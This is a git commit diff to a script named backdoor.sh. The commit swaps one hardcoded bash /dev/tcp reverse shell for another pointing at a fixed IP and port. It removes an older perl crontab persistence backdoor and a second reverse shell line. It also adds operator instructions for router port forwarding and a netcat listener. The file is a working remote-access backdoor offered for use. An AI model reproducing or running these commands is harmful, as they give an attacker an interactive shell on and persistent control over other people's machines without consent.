1d025aec6a94fcdb171cbec0e8d1fdc3d8f5209c
Angel Diaz <angel.diaz@gmail.com>
2019-02-26 08:23:12 +0100

    fixed reverse backdoor command and added instructions

--- backdoor.sh
+++ backdoor.sh
@@ -1,9 +1,11 @@
 #!/bin/bash
 
-# typeln("(crontab -l ; echo \"*/5 * * * * perl -MIO::Socket -e'\\$c=new IO::Socket::INET(\\\"72.14.179.47:1337\\\");print\\$c \\`\\$_\\`while<\\$c>'\")  | crontab -");
-# bash -i >& /dev/tcp/youripaddress/1337 0>&1
+# ip=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
+# bash -i >& /dev/tcp/youripaddress/8001 0>&1
 
-ip=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
-# bash -i >& /dev/tcp/$ip/1337 0>&1
+bash -i >& /dev/tcp/148.3.88.17/8001 0>&1
 
-bash -i >& /dev/tcp/207.38.94.28/13791 0>&1
+# INSTRUCTIONS:
+# 1. Open port 8001 on your router and forward it to your device's local IP on the same port
+# 2. Listen on your computer using NetCat running:
+#    nc -lvv 0.0.0.0 -p 8001
